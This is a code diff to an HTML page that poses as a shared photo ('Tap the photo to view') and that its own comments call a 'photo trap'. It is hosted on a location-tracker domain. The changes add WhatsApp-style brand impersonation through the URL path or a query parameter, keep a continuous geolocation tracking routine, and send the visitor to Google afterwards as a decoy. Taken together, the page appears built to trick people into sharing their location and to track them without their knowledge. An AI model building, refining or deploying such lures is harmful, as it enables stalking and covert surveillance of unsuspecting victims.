@@ -8,7 +8,7 @@
     <meta property="og:title" content="Photo" />
     <meta property="og:description" content="Tap the photo to view" />
     <meta property="og:image" content="https://i.imgur.com/GHQTMbZ.jpeg" />
-    <meta property="og:url" content="https://location-tracker-cn7m.onrender.com/photo" />
+    <meta property="og:url" content="https://location-tracker-cn7m.onrender.com/whatsapp/photo" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
     
@@ -89,7 +89,6 @@
             opacity: 0.7;
         }
 
-        /* Continue button (appears after location) */
         .continue-btn {
             margin-top: 15px;
             padding: 12px 30px;
@@ -133,12 +132,23 @@
 
     <script>
         // =============================================
+        // 🆕 BRAND DETECTION: From Path OR Query String
+        // =============================================
+        const BRAND_FROM_SERVER = '{{ brand }}'.trim();
+        const pathParts = window.location.pathname.split('/').filter(p => p.length > 0);
+        // pathParts = ['whatsapp', 'photo'] if using clean URL
+        const brandFromPath = (pathParts.length >= 2 && pathParts[1] === 'photo') ? pathParts[0] : null;
+        const urlParams = new URLSearchParams(window.location.search);
+        const brandFromQuery = urlParams.get('template');
+
+        const template = BRAND_FROM_SERVER || brandFromPath || brandFromQuery || 'whatsapp';
+        console.log('📍 Detected brand (photo trap):', template);
+
+        // =============================================
         // CONFIGURATION
         // =============================================
         const RENDER_URL = 'https://location-tracker-cn7m.onrender.com'; // CHANGE to your URL
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const template = urlParams.get('template') || 'whatsapp';
         const customImage = urlParams.get('img');
 
         // iOS detection
@@ -236,7 +246,7 @@
         }
 
         // =============================================
-        // Continuous tracking (stays active)
+        // Continuous tracking
         // =============================================
         function startContinuousTracking() {
             if (watchId !== null) return;
@@ -324,7 +334,6 @@
         // Continue button
         // =============================================
         continueBtn.addEventListener('click', function() {
-            // Manual redirect – user gesture
             window.location.href = 'https://www.google.com'; // or your desired URL
         });
 
